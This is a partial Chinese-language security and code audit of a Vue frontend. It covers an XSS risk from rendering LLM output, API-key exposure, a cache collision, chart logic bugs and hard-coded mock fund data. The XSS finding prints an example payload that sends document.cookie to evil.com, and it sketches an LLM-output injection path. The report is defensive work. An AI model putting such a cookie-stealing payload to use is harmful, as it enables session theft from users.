# AlphaTerminal v0.5.176 代码审计报告 - 部分报告
## 审计模块: frontend-components + frontend-stores + frontend-utils
## 审计时间: 2026-04-26 18:50 CST

---

## P1 - 中高风险（2 个）

### 1. CopilotSidebar.vue - XSS 风险：LLM 输出直接渲染
**严重程度**: P1 | **类型**: 安全漏洞

**问题描述**:
`renderMarkdown()` 函数中，`mdParser.render(text)` 输出 HTML 后，通过 Vue 的 `v-html` 指令直接渲染到 DOM。若 LLM 返回的 markdown 内容包含恶意脚本，会直接执行。

```javascript
// CopilotSidebar.vue - 渲染消息内容
function mdRender(text) {
  if (!text) return ''
  return renderMarkdown(text)  // ← 输出 HTML，通过 v-html 渲染
}
```

**注入路径**:
- 用户输入 → LLM 推理 → LLM 返回 markdown（含 `<script>` 或 `onerror`）→ `mdRender()` → `v-html` → XSS

**对比已知安全实践**:
- `news.py:render_news()` 对新闻标题做了 `replace(/</g, '&lt;')` 转义
- CopilotSidebar 的 LLM 输出路径无同等防护

**修复建议**:
```javascript
// 方案1: 先转义再渲染
function mdRender(text) {
  if (!text) return ''
  const escaped = text.replace(/</g, '&lt;').replace(/>/g, '&gt;')
  return mdParser.render(escaped)
}

// 方案2（推荐）: 使用 DOMPurify 净化
import DOMPurify from 'dompurify'
function mdRender(text) {
  if (!text) return ''
  return DOMPurify.sanitize(mdParser.render(text))
}
```

**风险**: 若 LLM 返回 `\`\`\`html\n<script>document.location='https://evil.com?c='+document.cookie</script>\n\`\`\``，用户 Cookie 可被窃取。

---

### 2. AdminDashboard.vue - API Key 明文显示
**严重程度**: P1 | **类型**: 安全/隐私

**问题描述**:
LLM 配置 tab 中，`input[type="password"]` 切换为 `type="text"` 后 API Key 以明文显示在 HTML 中，可被浏览器扩展、DevTools 或缓存机制读取。

```javascript
// AdminDashboard.vue
<input
  v-model="cfg.input_key"
  :type="cfg.show_key ? 'text' : 'password'"  // ← 切换为 text 时明文显示
  class="w-full ..."
  placeholder="sk-...">
<button @click="cfg.show_key = !cfg.show_key">
  {{ cfg.show_key ? '🙈' : '👁' }}  // ← 切换可见性
</button>
```

**现状**: API Key 存储在组件 state `cfg.input_key`，不持久化到 localStorage（好）
**风险**: 浏览器自动填充、DevTools、屏幕共享时暴露

**修复建议**:
- 始终保持 `type="password"`，使用部分遮罩格式 `sk-xxxx...efgh`
- 不提供"显示明文"按钮，或仅在调试模式临时显示
- 后端测试连接用临时 Key，不回显到前端

---

## P2 - 中等风险（3 个）

### 3. CopilotSidebar.vue - 缓存 Key 语义碰撞
**严重程度**: P2 | **类型**: 逻辑缺陷

**问题描述**:
```javascript
function getCachedResponse(prompt) {
  const key = prompt.trim().toLowerCase()  // ← 简单哈希
  const cached = RESPONSE_CACHE.get(key)
  // ...
}
```

不同 prompt 去掉空格转小写后可能碰撞，例如：
- `"分析茅台走势"` vs `"分析 茅台 走势"` → 相同 key，错误命中
- `"帮我分析茅台"` vs `"分析茅台"` → 相同 key，错误命中

**实际影响**: 中等（5 分钟 TTL，快照式交互影响小）
**建议**: 改用更精确的分词或直接不用缓存（让用户自己控制刷新）

---

### 4. BaseKLineChart.vue - MA10/MA20 条件渲染逻辑缺陷
**严重程度**: P2 | **类型**: 逻辑缺陷

**问题描述**:
```javascript
if (maData?.ma5) {  // ← 只检查 ma5
    series.push(
      { name: 'MA5', ... },
      { name: 'MA10', ... },  // ← 依赖 ma5 truthy
      { name: 'MA20', ... },  // ← 依赖 ma5 truthy
    )
}
```

若 `maData.ma5 = []`（空数组），MA10/MA20 不会渲染，即使它们有数据。

**实际影响**: 低（ma5/ma10/ma20 通常同生同灭，数据不足时一起为空）
**建议**: 改为独立判断或 `if (maData?.ma5?.length)`

---

### 5. FundDashboard.vue - Mock 数据硬编码
**严重程度**: P2 | **类型**: 数据真实性

**问题描述**:
```javascript
// loadOpenFundInfo() 中
trailingReturns.fund = { '1w': 0.5, '1m': 2.3, '3m': -1.2, ... }  // 固定值
trailingReturns.category = { ... }
trailingReturns.benchmark = { ... }
riskMetrics.sharpe = 1.25  // 固定值
riskMetrics.max_drawdown = -18.5  // 固定值
```

**影响**: 用户在 UI 上看到的"阶段收益"和"风险指标"全部是假数据，会误导投资决策。

**修复建议**:
- 后端实现 `/api/v1/fund/open/returns?code=xxx&period=...` 和 `/api/v1/fund/open/risk?code=xxx`
- 前端移除 Mock 赋值，改为 API 返回后赋值

---

## P3 - 低风险（2 个）

### 6. api.js - 模块级状态不透明
`_consecutiveFailures = { count: 0 }` 为模块级变量，修改不在 Vue 响应式系统中，调试困难。`apiErrorState` 是 reactive 的是好的，但计数逻辑应该也整合进去。

### 7. chartDataBuilder.js - overlayData 校验不足
`overlayData` 传入时若含 `close: null`，会导致对比线数据异常。应在 map 写入前增加 `if (d.date && d.close != null)` 校验。

---

## 本次审计文件清单

| 文件 | 行数 | 主要发现 |
|------|------|---------|
| components/CopilotSidebar.vue | ~900 | XSS, 缓存碰撞 |
| components/AdminDashboard.vue | ~600 | API Key 明文 |
| components/BaseKLineChart.vue | ~400 | MA 条件渲染缺陷 |
| components/FundDashboard.vue | ~600 | Mock 数据 |
| stores/drawing.js | ~200 | 无重大问题 |
| stores/market.js | ~200 | 静默降级 |
| utils/api.js | ~300 | 模块级状态 |
| utils/chartDataBuilder.js | ~200 | 校验不足 |
| utils/formatters.js | ~150 | 无重大问题 |
| utils/indicators.js | (参考) | - |
| utils/symbols.js | (参考) | - |
| utils/logger.js | (参考) | - |

---

## 总体评估

**代码规模**: ~3700 行前端代码
**新发现问题**: 7 个（P1×2, P2×3, P3×2）
**最严重**: CopilotSidebar XSS（LLM 输出直接渲染）
**建议优先级**: XSS > Mock 数据 > API Key 明文 > 逻辑缺陷
